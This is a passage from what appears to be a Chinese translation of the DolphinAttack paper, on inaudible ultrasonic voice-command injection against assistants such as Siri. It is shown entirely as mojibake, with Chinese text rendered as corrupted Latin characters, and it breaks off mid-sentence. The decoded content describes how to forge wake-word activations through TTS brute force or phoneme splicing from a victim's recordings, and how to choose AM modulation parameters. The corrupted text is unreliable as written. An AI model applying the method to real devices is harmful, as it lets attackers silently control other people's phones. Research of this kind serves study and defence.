æ­¤è§£è°ƒçš„æ½œåœ¨ç»„ä»¶æ˜¯éº¦å…‹é£å’Œæ”¾å¤§å™¨ã€‚æˆ‘ä»¬ç ”ç©¶äº†å®ŒæˆDolphinAttackçš„åŸç†ã€‚å°½ç®¡è¯¸å¦‚æ”¾å¤§å™¨ä¹‹ç±»çš„ç”µå­ç»„ä»¶è¢«è®¾è®¡ä¸ºçº¿æ€§çš„ï¼Œä½†å®é™…ä¸Šå®ƒä»¬è¡¨ç°å‡ºéçº¿æ€§ã€‚åˆ©ç”¨è¿™ç§éçº¿æ€§ç‰¹æ€§ï¼Œç”µå­å…ƒä»¶èƒ½å¤Ÿåˆ›å»ºæ–°çš„é¢‘ç‡[25]ã€‚å°½ç®¡å·²ç»æŠ¥é“å¹¶åˆ©ç”¨äº†æ”¾å¤§å™¨æ¨¡å—çš„éçº¿æ€§ï¼Œä½†åŒ…æ‹¬ECMéº¦å…‹é£å’ŒMEMSéº¦å…‹é£åœ¨å†…çš„éº¦å…‹é£æ˜¯å¦å…·æœ‰è¿™ç§ç‰¹æ€§ä»æ˜¯æœªçŸ¥çš„ã€‚ä¸ºäº†è¿›è¡Œç ”ç©¶ï¼Œæˆ‘ä»¬é¦–å…ˆåœ¨ç†è®ºä¸Šå¯¹éº¦å…‹é£æ¨¡å—çš„éçº¿æ€§å»ºæ¨¡ï¼Œç„¶åæ˜¾ç¤ºéçº¿æ€§å¯¹å®é™…éº¦å…‹é£æ¨¡å—çš„å½±å“ã€‚ 3.1éçº¿æ€§æ•ˆåº”å»ºæ¨¡éº¦å…‹é£å°†æœºæ¢°å£°æ³¢è½¬æ¢ä¸ºç”µä¿¡å·ã€‚ ä»æœ¬è´¨ä¸Šè®²ï¼Œéº¦å…‹é£å¯ä»¥ç²—ç•¥åœ°è§†ä¸ºåœ¨è¾“å…¥/è¾“å‡ºä¿¡å·ä¼ è¾“ç‰¹æ€§ä¸­å…·æœ‰å¹³æ–¹å¾‹éçº¿æ€§çš„ç»„ä»¶[1ã€13]ã€‚ ä¼—æ‰€å‘¨çŸ¥ï¼Œæ”¾å¤§å™¨å…·æœ‰éçº¿æ€§ç‰¹æ€§ï¼Œå¯ä»¥äº§ç”Ÿä½é¢‘èŒƒå›´å†…çš„è§£è°ƒä¿¡å·[20]ã€‚ åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬ç ”ç©¶äº†éº¦å…‹é£çš„éçº¿æ€§ï¼Œå¯ä»¥å°†å…¶å»ºæ¨¡å¦‚ä¸‹ã€‚ å‡è®¾è¾“å…¥ä¿¡å·ä¸ºsinï¼ˆtï¼‰ï¼Œè¾“å‡ºä¿¡å·soutï¼ˆtï¼‰ä¸ºï¼š å…¶ä¸­Aæ˜¯è¾“å…¥ä¿¡å·çš„å¢ç›Šï¼ŒBæ˜¯äºŒæ¬¡é¡¹s2 inçš„å¢ç›Šã€‚çº¿æ€§åˆ†é‡é‡‡ç”¨é¢‘ç‡ä¸ºfçš„æ­£å¼¦è¾“å…¥ä¿¡å·ï¼Œå¹¶è¾“å‡ºå…·æœ‰ç›¸åŒé¢‘ç‡fçš„æ­£å¼¦ä¿¡å·ã€‚ ç›¸æ¯”ä¹‹ä¸‹ï¼Œç”µæ°”è®¾å¤‡çš„éçº¿æ€§ä¼šäº§ç”Ÿè°æ³¢å’Œå‰ç§¯2ã€‚å°½ç®¡é€šå¸¸å°†å®ƒä»¬è§†ä¸ºä¸å¸Œæœ›çš„å¤±çœŸ[31]ï¼Œä½†å…·æœ‰éçº¿æ€§çš„è®¾å¤‡èƒ½å¤Ÿç”Ÿæˆæ–°çš„é¢‘ç‡ï¼Œå¹¶ä¸”é€šè¿‡ç²¾å¿ƒè®¾è®¡çš„è¾“å…¥ä¿¡å·ï¼Œå®ƒä»¬å¯ä»¥å°†ä¿¡å·ä¸‹å˜é¢‘ä¸º ä»¥åŠæ¢å¤åŸºå¸¦ä¿¡å·ã€‚å‡è®¾æ‰€éœ€çš„è¯­éŸ³æ§åˆ¶ä¿¡å·ä¸ºmï¼ˆtï¼‰ï¼Œæˆ‘ä»¬é€‰æ‹©ä¸­å¿ƒé¢‘ç‡ä¸ºfcçš„è½½æ³¢ä¸Šçš„è°ƒåˆ¶ä¿¡å·ä¸º å³ï¼Œä½¿ç”¨å¹…åº¦è°ƒåˆ¶ã€‚ ä¸å¤±ä¸€èˆ¬æ€§ï¼Œè®¾mï¼ˆtï¼‰ä¸ºç®€å•åŸºè°ƒï¼Œå³mï¼ˆtï¼‰= cosï¼ˆ2Ï€fmtï¼‰ã€‚ åº”ç”¨ç­‰å¼åã€‚ ï¼ˆ2ï¼‰è‡³ ï¼ˆ1ï¼‰å¹¶è¿›è¡Œå‚…ç«‹å¶å˜æ¢ï¼Œæˆ‘ä»¬å¯ä»¥ç¡®è®¤è¾“å‡ºä¿¡å·åŒ…å«é¢„æœŸçš„é¢‘ç‡åˆ†é‡fmä»¥åŠsinçš„åŸºæœ¬é¢‘ç‡åˆ†é‡ï¼ˆå³fc-fmï¼Œfc + fmå’Œfcï¼‰ï¼Œè°æ³¢å’Œå…¶ä»–äº¤å‰ ä¹˜ç§¯ï¼ˆå³fmï¼Œ2ï¼ˆfc-fmï¼‰ï¼Œ2ï¼ˆfc + fmï¼‰ï¼Œ2fcï¼Œ2fc + fmå’Œ2fc-fmï¼‰ã€‚ ç»è¿‡LPFåï¼Œæ‰€æœ‰é«˜é¢‘æˆåˆ†å°†è¢«åˆ é™¤ï¼Œè€Œfmé¢‘ç‡æˆåˆ†å°†ä¿ç•™ä¸‹æ¥ï¼Œä»è€Œå®Œæˆäº†ä¸‹å˜é¢‘ï¼Œå¦‚å›¾3æ‰€ç¤ºã€‚ 3.2 éçº¿æ€§æ•ˆåº”è¯„ä¼°è€ƒè™‘åˆ°éº¦å…‹é£æ¨¡å—éçº¿æ€§æ•ˆåº”çš„ç†è®ºè®¡ç®—åŠå…¶å¯¹è°ƒåˆ¶åè¾“å…¥ä¿¡å·çš„å½±å“ï¼Œåœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†éªŒè¯å¯¹çœŸå®éº¦å…‹é£çš„éçº¿æ€§æ•ˆåº”ã€‚æˆ‘ä»¬æµ‹è¯•ä¸¤ç§ç±»å‹çš„éº¦å…‹é£ï¼šECMå’ŒMEMSéº¦å…‹é£ã€‚ 3.2.1 å®éªŒè®¾ç½®å®éªŒè®¾ç½®å¦‚å›¾5æ‰€ç¤ºã€‚æˆ‘ä»¬ä½¿ç”¨iPhone SEæ™ºèƒ½æ‰‹æœºç”Ÿæˆ2 kHzè¯­éŸ³æ§åˆ¶ä¿¡å·ï¼Œå³åŸºå¸¦ä¿¡å·ã€‚ç„¶åå°†åŸºå¸¦ä¿¡å·è¾“å…¥åˆ°çŸ¢é‡ä¿¡å·å‘ç”Ÿå™¨[57]ï¼Œè¯¥ä¿¡å·å‘ç”Ÿå™¨å°†åŸºå¸¦ä¿¡å·è°ƒåˆ¶åˆ°è½½æ³¢ä¸Šã€‚ç»åŠŸç‡æ”¾å¤§å™¨æ”¾å¤§åï¼Œè°ƒåˆ¶ä¿¡å·ç”±é«˜è´¨é‡çš„å…¨é¢‘å¸¦è¶…å£°æ‰¬å£°å™¨Vifaä¼ è¾“[9]ã€‚è¯·æ³¨æ„ï¼Œæˆ‘ä»¬é€‰æ‹©çš„è½½æ³¢èŒƒå›´ä¸º9 kHzè‡³20 kHzï¼Œå› ä¸ºä¿¡å·å‘ç”Ÿå™¨æ— æ³•ç”Ÿæˆä½äº9 kHzé¢‘ç‡çš„ä¿¡å·ã€‚åœ¨æ¥æ”¶å™¨ç«¯ï¼Œæˆ‘ä»¬æµ‹è¯•äº†ä»è€³æœºä¸­æå–çš„ECMéº¦å…‹é£å’ŒADMP401 MEMSéº¦å…‹é£[16]ã€‚å¦‚å›¾5æ‰€ç¤ºï¼ŒADMP401éº¦å…‹é£æ¨¡å—åŒ…å«ä¸€ä¸ªå‰ç½®æ”¾å¤§å™¨ã€‚ä¸ºäº†äº†è§£éº¦å…‹é£çš„ç‰¹æ€§ï¼Œæˆ‘ä»¬æµ‹é‡äº†éº¦å…‹é£è€Œä¸æ˜¯å‰ç½®æ”¾å¤§å™¨è¾“å‡ºçš„ä¿¡å·ã€‚ 3.2.2 ç»“æœæˆ‘ä»¬ä½¿ç”¨ä¸¤ç§ä¿¡å·æ¥ç ”ç©¶éçº¿æ€§ï¼šå•éŸ³å’Œå¤šéŸ³è¯­éŸ³ã€‚å•éŸ³: å›¾4æ˜¾ç¤ºäº†å½“æˆ‘ä»¬ä½¿ç”¨20 kHzè½½æ³¢æ—¶çš„ç»“æœï¼Œè¿™è¯å®äº†éº¦å…‹é£çš„éçº¿æ€§æœ‰åŠ©äºè§£è°ƒåŸºå¸¦ä¿¡å·ã€‚å‰ä¸¤ä¸ªå›¾æ˜¾ç¤ºäº†æ¥è‡ªæ‰¬å£°å™¨çš„åŸå§‹ä¿¡å·çš„æ—¶åŸŸå’Œé¢‘åŸŸï¼Œä»è€Œå¾ˆå¥½åœ°æ˜¾ç¤ºäº†è½½æ³¢é¢‘ç‡ï¼ˆ20 kHzï¼‰å’Œä¸Šè¾¹å¸¦ä»¥åŠä¸‹è¾¹å¸¦ï¼ˆ20Â±2 kHzï¼‰ã€‚ç¬¬äºŒè¡Œä¸­çš„ä¸¤ä¸ªå›¾æ˜¾ç¤ºäº†æ¥è‡ªMEMSéº¦å…‹é£çš„è¾“å‡ºä¿¡å·ï¼Œä¸‹é¢ä¸¤ä¸ªå›¾æ˜¾ç¤ºäº†æ¥è‡ªECMéº¦å…‹é£çš„è¾“å‡ºä¿¡å·ã€‚å³ä½¿ä¿¡å·è¢«è¡°å‡ï¼Œå°¤å…¶æ˜¯å¯¹äºECMéº¦å…‹é£ï¼Œä¸¤ä¸ªéº¦å…‹é£åœ¨é¢‘åŸŸä¸­çš„åŸºå¸¦ï¼ˆ2 kHzï¼‰ä»èƒ½è¯å®è§£è°ƒæˆåŠŸã€‚è¯·æ³¨æ„ï¼Œé¢‘åŸŸå›¾åŒ…å«å¤šä¸ªé«˜é¢‘è°æ³¢ï¼Œè¿™äº›è°æ³¢å°†è¢«LPFè¿‡æ»¤ï¼Œå¹¶ä¸”ä¸ä¼šå½±å“è¯­éŸ³è¯†åˆ«ã€‚ å£°éŸ³: å°½ç®¡æˆ‘ä»¬å¯ä»¥æˆåŠŸåœ°è§£è°ƒå‡ºä¿¡å·éŸ³ï¼Œä½†è¯­éŸ³æ˜¯å„ç§é¢‘ç‡ä¸‹æ— æ•°éŸ³è°ƒçš„æ··åˆï¼Œå¹¶ä¸”æœªçŸ¥è§£è°ƒåçš„è¯­éŸ³ä¿¡å·æ˜¯å¦ä»ä¸åŸå§‹ä¿¡å·ç›¸ä¼¼ã€‚å› æ­¤ï¼Œæˆ‘ä»¬è®¡ç®—äº†ä¸‰ä¸ªâ€œ Heyâ€å£°éŸ³ç‰‡æ®µä¸­çš„Melé¢‘ç‡å€’è°±ç³»æ•°ï¼ˆMFCCï¼‰ï¼Œè¿™æ˜¯å£°éŸ³ä½¿ç”¨æœ€å¹¿æ³›çš„åŠŸèƒ½ä¹‹ä¸€ï¼šï¼ˆaï¼‰ç”±æ–‡æœ¬è¯­éŸ³è½¬æ¢ï¼ˆTTSï¼‰å¼•æ“ç”Ÿæˆçš„åŸå§‹è¯­éŸ³ï¼Œï¼ˆbï¼‰ä¸‰æ˜ŸGalaxy S6 Edgeä»¥iPhone 6 pluså½•åˆ¶çš„è¯­éŸ³æ’­æ”¾äº†åŸå§‹TTSè¯­éŸ³ï¼Œä»¥åŠï¼ˆcï¼‰ä¸‰æ˜ŸS6 Edgeä»¥TTSè¯­éŸ³è°ƒåˆ¶çš„è¯­éŸ³ç”±å…¨é¢‘å¸¦è¶…å£°æ‰¬å£°å™¨è°ƒåˆ¶å’Œæ’­æ”¾Vifa [9]ã€‚å¦‚å›¾6æ‰€ç¤ºï¼Œè¿™ä¸‰ç§æƒ…å†µçš„MFCCéƒ½æ˜¯ç›¸ä¼¼çš„ã€‚ä¸ºäº†é‡åŒ–ç›¸ä¼¼åº¦ï¼Œæˆ‘ä»¬è®¡ç®—äº†åŸå§‹å’Œè®°å½•ä¹‹é—´çš„æ¢…å°”å€’è°±å¤±çœŸï¼ˆMCDï¼‰ï¼Œæƒ…å†µï¼ˆbï¼‰ä¸º3.1ï¼Œæƒ…å†µï¼ˆcï¼‰ä¸º7.6ã€‚ MCDé‡åŒ–ä¸¤ä¸ªMFCCä¹‹é—´çš„å¤±çœŸï¼Œæ•°å€¼è¶Šå°è¶Šå¥½ã€‚é€šå¸¸ï¼Œå¦‚æœä¸¤ä¸ªè¯­éŸ³çš„MCDå€¼å°äº8 [23]ï¼Œåˆ™è®¤ä¸ºå®ƒä»¬å¯ä»¥è¢«è¯­éŸ³è¯†åˆ«ç³»ç»Ÿæ¥å—ï¼Œå› æ­¤ç»“æœé¼“åŠ±æˆ‘ä»¬å¯¹DolphinAttacké’ˆå¯¹è¯­éŸ³å¯æ§ç³»ç»Ÿè¿›è¡Œè¿›ä¸€æ­¥çš„ç ”ç©¶ã€‚ 4 æ”»å‡»è®¾è®¡DolphinAttackåˆ©ç”¨å¬ä¸è§çš„è¯­éŸ³æ³¨å…¥æ¥é™é»˜æ§åˆ¶VCSã€‚ç”±äºæ”»å‡»è€…å‡ ä¹æ— æ³•æ§åˆ¶VCSï¼Œå› æ­¤æˆåŠŸè¿›è¡Œæ”»å‡»çš„å…³é”®æ˜¯åœ¨æ”»å‡»å‘é€æ–¹ç”Ÿæˆå¬ä¸è§çš„è¯­éŸ³å‘½ä»¤ã€‚ç‰¹åˆ«æ˜¯ï¼ŒDolphinAttackå¿…é¡»ä¸ºVCSçš„æ¿€æ´»å’Œè¯†åˆ«é˜¶æ®µç”Ÿæˆè¯­éŸ³å‘½ä»¤çš„åŸºå¸¦ä¿¡å·ï¼Œå¯¹åŸºå¸¦ä¿¡å·è¿›è¡Œè°ƒåˆ¶ï¼Œä»¥ä¾¿å¯ä»¥åœ¨VCSä¸Šå¯¹å…¶è¿›è¡Œæœ‰æ•ˆè§£è°ƒï¼Œå¹¶è®¾è®¡ä¸€ç§å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹å¯åŠ¨DolphinAttackçš„ä¾¿æºå¼å‘å°„æœºã€‚ DolphinAttackçš„åŸºæœ¬æ„å»ºæ¨¡å—å¦‚å›¾7æ‰€ç¤ºï¼Œæˆ‘ä»¬å°†åœ¨ä»¥ä¸‹å°èŠ‚ä¸­è®¨è®ºè¿™äº›ç»†èŠ‚ã€‚åœ¨ä¸å¤±ä¸€èˆ¬æ€§çš„å‰æä¸‹ï¼Œæˆ‘ä»¬é€šè¿‡ä½¿ç”¨Siriä½œä¸ºæ¡ˆä¾‹ç ”ç©¶æ¥è®¨è®ºè®¾è®¡ç»†èŠ‚ï¼Œå¹¶ä¸”è¯¥æŠ€æœ¯å¯ä»¥è½»æ¾åœ°åº”ç”¨äºå…¶ä»–SRç³»ç»Ÿï¼ˆä¾‹å¦‚Google Nowï¼ŒHiVoiceï¼‰ã€‚ 4.1 è¯­éŸ³å‘½ä»¤ç”ŸæˆSiriçš„å·¥ä½œåˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼šæ¿€æ´»å’Œè¯†åˆ«ã€‚å®ƒåœ¨æ¥å—è¯­éŸ³å‘½ä»¤ä¹‹å‰éœ€è¦æ¿€æ´»ï¼Œå› æ­¤æˆ‘ä»¬ç”Ÿæˆä¸¤ç§ç±»å‹çš„è¯­éŸ³å‘½ä»¤ï¼šæ¿€æ´»å‘½ä»¤å’Œå¸¸è§„æ§åˆ¶å‘½ä»¤ã€‚ä¸ºäº†æ§åˆ¶VCSï¼ŒDolphinAttackå¿…é¡»åœ¨æ³¨å…¥å¸¸è§„æ§åˆ¶å‘½ä»¤ä¹‹å‰ç”Ÿæˆæ¿€æ´»å‘½ä»¤ã€‚ 4.1.1 æ¿€æ´»å‘½ä»¤ç”ŸæˆæˆåŠŸçš„æ¿€æ´»å‘½ä»¤å¿…é¡»æ»¡è¶³ä¸¤ä¸ªè¦æ±‚ï¼šï¼ˆaï¼‰åŒ…å«å”¤é†’è¯â€œ Hey Siriâ€ï¼Œä»¥åŠï¼ˆbï¼‰è°ƒæˆæ¥å—Siriè®­ç»ƒçš„ç”¨æˆ·çš„ç‰¹å®šè¯­éŸ³ã€‚åˆ›å»ºå…·æœ‰è¿™ä¸¤ä¸ªè¦æ±‚çš„æ¿€æ´»å‘½ä»¤å…·æœ‰æŒ‘æˆ˜æ€§ï¼Œé™¤éæ”»å‡»è€…åœ¨é™„è¿‘å¹¶è®¾æ³•åˆ›å»ºæ¸…æ™°çš„è®°å½•æ—¶ç”¨æˆ·ç¢°å·§è¯´â€œ Hey Siriâ€ã€‚å®é™…ä¸Šï¼Œæ”»å‡»è€…æœ€å¤šå¯ä»¥å¶ç„¶è®°å½•ä»»æ„å•è¯ã€‚å¦‚æœå¯èƒ½çš„è¯ï¼Œä½¿ç”¨ç°æœ‰çš„è¯­éŸ³åˆæˆæŠ€æœ¯[38]å’Œä»å½•éŸ³ä¸­æå–çš„ç‰¹å¾æ¥ç”Ÿæˆç‰¹å®šè¯­éŸ³çš„â€œå˜¿Siriâ€æ˜¯æå…¶ä¸åŒçš„ï¼Œå› ä¸ºç›®å‰å°šä¸æ¸…æ¥šSiriä½¿ç”¨å“ªäº›ç‰¹å¾é›†è¿›è¡Œè¯­éŸ³è¯†åˆ«ã€‚å› æ­¤ï¼Œæˆ‘ä»¬è®¾è®¡äº†ä¸¤ç§æ–¹æ³•æ¥åˆ†åˆ«é’ˆå¯¹ä¸¤ç§æƒ…å†µç”Ÿæˆæ¿€æ´»å‘½ä»¤ï¼šï¼ˆaï¼‰æ”»å‡»è€…æ‰¾ä¸åˆ°Siriçš„æ‰€æœ‰è€…ï¼ˆä¾‹å¦‚ï¼Œæ”»å‡»è€…è·å¾—äº†è¢«ç›—çš„æ™ºèƒ½æ‰‹æœºï¼‰ï¼Œä»¥åŠï¼ˆbï¼‰æ”»å‡»è€…å¯ä»¥è·å¾—ä¸€äº›å½•éŸ³ä¸»äººçš„å£°éŸ³ã€‚ï¼ˆ1ï¼‰åŸºäºTTSçš„è›®åŠ›ã€‚ TTSæŠ€æœ¯çš„æœ€æ–°è¿›å±•ä½¿å°†æ–‡æœ¬è½¬æ¢ä¸ºè¯­éŸ³å˜å¾—å®¹æ˜“ã€‚ å› æ­¤ï¼Œå³ä½¿æ”»å‡»è€…æ²¡æœ‰æœºä¼šä»ç”¨æˆ·é‚£é‡Œè·å¾—ä»»ä½•è¯­éŸ³è®°å½•ï¼Œæ”»å‡»è€…ä¹Ÿå¯ä»¥é€šè¿‡TTSï¼ˆæ–‡æœ¬åˆ°è¯­éŸ³ï¼‰ç³»ç»Ÿç”Ÿæˆä¸€ç»„åŒ…å«å”¤é†’è¯çš„æ¿€æ´»å‘½ä»¤ã€‚ è§‚å¯Ÿåˆ°çš„å¯å‘æ˜¯ï¼Œå…·æœ‰ç›¸ä¼¼å£°è°ƒçš„ä¸¤ä¸ªç”¨æˆ·å¯ä»¥æ¿€æ´»å¦ä¸€ä¸ªäººçš„Siriã€‚ å› æ­¤ï¼Œåªè¦é›†åˆä¸­çš„æ¿€æ´»å‘½ä»¤ä¹‹ä¸€å…·æœ‰ä¸æ‰€æœ‰è€…è¶³å¤Ÿæ¥è¿‘çš„å£°éŸ³ï¼Œå°±è¶³ä»¥æ¿€æ´»Siriã€‚ åœ¨DolphinAttackä¸­ï¼Œæˆ‘ä»¬å€ŸåŠ©ç°æœ‰çš„TTSç³»ç»Ÿï¼ˆå¦‚è¡¨1æ‰€ç¤ºï¼‰å‡†å¤‡äº†ä¸€ç»„å…·æœ‰å„ç§éŸ³è°ƒå’ŒéŸ³è‰²çš„æ¿€æ´»å‘½ä»¤ï¼Œå…¶ä¸­åŒ…æ‹¬Selvy Speechï¼ŒBaiduï¼ŒGoogleç­‰ã€‚æ€»å…±ï¼Œæˆ‘ä»¬è·å¾—äº†90ç§ç±»å‹çš„TTS å£°éŸ³ã€‚ æˆ‘ä»¬é€‰æ‹©Google TTSè¯­éŸ³æ¥è®­ç»ƒSiriï¼Œå…¶ä½™çš„ç”¨äºæ”»å‡» ï¼ˆ2ï¼‰çº§è”ç»¼åˆã€‚å½“æ”»å‡»è€…å¯ä»¥å½•åˆ¶æ¥è‡ªSiriæ‰€æœ‰è€…çš„å‡ ä¸ªå•è¯ä½†ä¸æ˜¯å¿…éœ€çš„â€œå˜¿Siriâ€æ—¶ï¼Œæˆ‘ä»¬å»ºè®®é€šè¿‡ä»å¯ç”¨å½•åˆ¶ä¸­çš„å…¶ä»–å•è¯ä¸­æœç´¢ç›¸å…³çš„éŸ³ç´ æ¥åˆæˆæ‰€éœ€çš„è¯­éŸ³å‘½ä»¤ã€‚è‹±æ–‡å¤§çº¦æœ‰44ä¸ªéŸ³ç´ ï¼Œè€Œå”¤é†’å­—â€œå˜¿Siriâ€ä½¿ç”¨6ä¸ªéŸ³ç´ ï¼ˆå³HHï¼ŒEYï¼ŒSï¼ŒIHï¼ŒRï¼ŒIYï¼‰ã€‚è®¸å¤šå•è¯çš„å‘éŸ³ä¸â€œ Heyâ€æˆ–â€œ Siâ€æˆ–â€œ riâ€ç›¸åŒï¼Œå¯ä»¥å°†å®ƒä»¬æ‹¼æ¥åœ¨ä¸€èµ·ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥å°†â€œ heâ€å’Œâ€œ cakeâ€è¿æ¥èµ·æ¥ä»¥è·å¾—â€œ Heyâ€ã€‚åŒæ ·ï¼Œâ€œ Siriâ€å¯ä»¥æ˜¯â€œåŸå¸‚â€å’Œâ€œæºå¸¦â€çš„ç»„åˆã€‚å¦‚å›¾8æ‰€ç¤ºï¼Œæˆ‘ä»¬é¦–å…ˆåœ¨è®°å½•çš„å¥å­ä¸­æœç´¢å•ä¸ªæˆ–ç»„åˆçš„éŸ³ç´ ï¼Œç„¶åå¦‚æœæ‰¾åˆ°åŒ¹é…é¡¹ï¼Œåˆ™æå–æ„Ÿå…´è¶£çš„ç‰‡æ®µã€‚æœ€åï¼Œå°†åŒ¹é…çš„éŸ³ç´ ç»„åˆåœ¨ä¸€èµ·ã€‚ä¸ºäº†è¯„ä¼°è¯¥æ–¹æ¡ˆçš„å¯è¡Œæ€§ï¼Œæˆ‘ä»¬è¿›è¡Œäº†ä»¥ä¸‹å®éªŒã€‚æˆ‘ä»¬ä½¿ç”¨Google TTSç”Ÿæˆç”¨äºè®­ç»ƒSRç³»ç»Ÿçš„â€œ Hey Siriâ€ï¼Œå¹¶ç”Ÿæˆä¸¤ç»„å€™é€‰è¯­éŸ³ä»¥åˆæˆâ€œ Hey Siriâ€ï¼š1.â€œ heâ€ï¼Œâ€œ cakeâ€ï¼Œâ€œ cityâ€ï¼Œâ€œ carryâ€ï¼› 2.â€œhe is a boyâ€, â€œeat a cakeâ€, â€œin the cityâ€, â€œread after meâ€ã€‚åˆæˆæ¿€æ´»å‘½ä»¤åï¼Œæˆ‘ä»¬ä½¿ç”¨å¦‚å›¾5æ‰€ç¤ºçš„ç›¸åŒå®éªŒè®¾ç½®åœ¨iPhone 4Sä¸Šå¯¹å…¶è¿›è¡Œæµ‹è¯•ã€‚ä¸¤ä¸ªåˆæˆçš„â€œ Hey Siriâ€éƒ½å¯ä»¥æˆåŠŸæ¿€æ´»Siriã€‚ 4.1.2 é€šç”¨æ§åˆ¶å‘½ä»¤ç”Ÿæˆå¸¸è§„æ§åˆ¶å‘½ä»¤å¯ä»¥æ˜¯å¯åŠ¨åº”ç”¨ç¨‹åºï¼ˆä¾‹å¦‚ï¼Œâ€œæ‹¨æ‰“911â€ï¼Œâ€œæ‰“å¼€www.google.comâ€ï¼‰æˆ–é…ç½®è®¾å¤‡ï¼ˆä¾‹å¦‚ï¼Œâ€œå¼€å¯é£è¡Œæ¨¡å¼â€ï¼‰çš„ä»»ä½•å‘½ä»¤ã€‚ä¸æ¿€æ´»å‘½ä»¤ä¸åŒï¼ŒSRç³»ç»Ÿä¸ä¼šéªŒè¯æ§åˆ¶å‘½ä»¤çš„èº«ä»½ã€‚å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥é€‰æ‹©ä»»ä½•æ§åˆ¶å‘½ä»¤çš„æ–‡æœ¬ï¼Œå¹¶åˆ©ç”¨TTSç³»ç»Ÿç”Ÿæˆå‘½ä»¤ã€‚ 4.1.3 è¯„ä¼°æˆ‘ä»¬æµ‹è¯•æ¿€æ´»å’Œæ§åˆ¶å‘½ä»¤ã€‚åœ¨ä¸å¤±ä¸€èˆ¬æ€§çš„å‰æä¸‹ï¼Œæˆ‘ä»¬é€šè¿‡åˆ©ç”¨Tabä¸­æ€»ç»“çš„TTSç³»ç»Ÿç”Ÿæˆæ¿€æ´»å’Œæ§åˆ¶å‘½ä»¤ã€‚ 1.ç‰¹åˆ«æ˜¯ï¼Œæˆ‘ä»¬ä»è¿™äº›TTSç³»ç»Ÿçš„ç½‘ç«™ä¸Šä¸‹è½½äº†ä¸¤ä¸ªè¯­éŸ³å‘½ä»¤ï¼šâ€œ Hey Siriâ€å’Œâ€œ call 1234567890â€ã€‚å¯¹äºæ¿€æ´»ï¼Œæˆ‘ä»¬ä½¿ç”¨Google TTSç³»ç»Ÿä¸­çš„â€œ Hey Siriâ€æ¥è®­ç»ƒSiriï¼Œå…¶ä½™çš„ç”¨äºæµ‹è¯•ã€‚æˆ‘ä»¬é€šè¿‡iPhone 6 Pluså’Œå°å¼è®¾å¤‡æ’­æ”¾è¯­éŸ³å‘½ä»¤ï¼ˆå¦‚å›¾5æ‰€ç¤ºï¼‰ï¼Œå¹¶åœ¨iPhone 4Sä¸Šè¿›è¡Œæµ‹è¯•ã€‚é€‰é¡¹å¡ä¸­æ±‡æ€»äº†è¿™ä¸¤ä¸ªå‘½ä»¤çš„æ¿€æ´»å’Œè¯†åˆ«ç»“æœã€‚ç»“æœè¡¨æ˜ï¼ŒSRç³»ç»Ÿå¯ä»¥è¯†åˆ«æ¥è‡ªä»»ä½•TTSç³»ç»Ÿçš„æ§åˆ¶å‘½ä»¤ã€‚åœ¨89ç§ç±»å‹çš„æ¿€æ´»å‘½ä»¤ä¸­ï¼Œæœ‰35ç§å¯ä»¥æ¿€æ´»Siriï¼ŒæˆåŠŸç‡ä¸º39ï¼…ã€‚ 4.2 è¯­éŸ³å‘½ä»¤è°ƒåˆ¶ç”Ÿæˆè¯­éŸ³å‘½ä»¤çš„åŸºå¸¦ä¿¡å·åï¼Œæˆ‘ä»¬éœ€è¦åœ¨è¶…å£°è½½æ³¢ä¸Šå¯¹å…¶è¿›è¡Œè°ƒåˆ¶ï¼Œä»¥ä½¿å®ƒä»¬å¬ä¸åˆ°ã€‚ ä¸ºäº†åˆ©ç”¨éº¦å…‹é£çš„éçº¿æ€§ï¼ŒDolphinAttackå¿…é¡»åˆ©ç”¨å¹…åº¦è°ƒåˆ¶ï¼ˆAMï¼‰ã€‚ 4.2.1 AMè°ƒåˆ¶å‚æ•°åœ¨AMä¸­ï¼Œè½½æ³¢çš„å¹…åº¦ä¸åŸºå¸¦ä¿¡å·æˆæ¯”ä¾‹åœ°å˜åŒ–ï¼Œå¹¶ä¸”å¹…åº¦è°ƒåˆ¶äº§ç”Ÿä¸€ä¸ªä¿¡å·ï¼Œå…¶åŠŸç‡é›†ä¸­åœ¨è½½æ³¢é¢‘ç‡å’Œä¸¤ä¸ªç›¸é‚»çš„è¾¹å¸¦ä¸Šï¼Œå¦‚å›¾9æ‰€ç¤ºã€‚ æè¿°å¦‚ä½•åœ¨DolphinAttackä¸­é€‰æ‹©AMå‚æ•°ã€‚ï¼ˆ1ï¼‰æ·±åº¦ï¼šè°ƒåˆ¶æ·±åº¦må®šä¹‰ä¸ºm ï¼ M / Aï¼Œå…¶ä¸­Aæ˜¯è½½æ³¢å¹…åº¦ï¼ŒMæ˜¯è°ƒåˆ¶å¹…åº¦ï¼Œå³ï¼ŒMæ˜¯å¹…åº¦ä»å…¶æœªè°ƒåˆ¶å€¼èµ·çš„å³°å€¼å˜åŒ–ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœm = 0.5ï¼Œåˆ™è½½æ³¢å¹…åº¦åœ¨å…¶æœªè°ƒåˆ¶ç”µå¹³ä¹‹ä¸Šï¼ˆæˆ–ä¹‹ä¸‹ï¼‰å˜åŒ–50ï¼…ã€‚ è°ƒåˆ¶æ·±åº¦ä¸éº¦å…‹é£éçº¿æ€§æ•ˆåº”çš„åˆ©ç”¨ç›´æ¥ç›¸å…³ï¼Œæˆ‘ä»¬çš„å®éªŒè¡¨æ˜ï¼Œè°ƒåˆ¶æ·±åº¦ä¸ç¡¬ä»¶æœ‰å…³ï¼ˆåœ¨ç¬¬5èŠ‚ä¸­æœ‰è¯¦ç»†ä»‹ç»ï¼‰ã€‚ï¼ˆ2ï¼‰è½½æ³¢é¢‘ç‡ã€‚è½½æ³¢é¢‘ç‡çš„é€‰æ‹©å–å†³äºå‡ ä¸ªå› ç´ ï¼šè¶…å£°æ³¢çš„é¢‘ç‡èŒƒå›´ï¼ŒåŸºå¸¦ä¿¡å·çš„å¸¦å®½ï¼Œä½é€šæ»¤æ³¢å™¨çš„æˆªæ­¢é¢‘ç‡ä»¥åŠVCSä¸Šéº¦å…‹é£çš„é¢‘ç‡å“åº”ä»¥åŠé¢‘ç‡æ”»å‡»è€…çš„å›åº”ã€‚è°ƒåˆ¶ä¿¡å·çš„æœ€ä½é¢‘ç‡åº”å¤§äº20 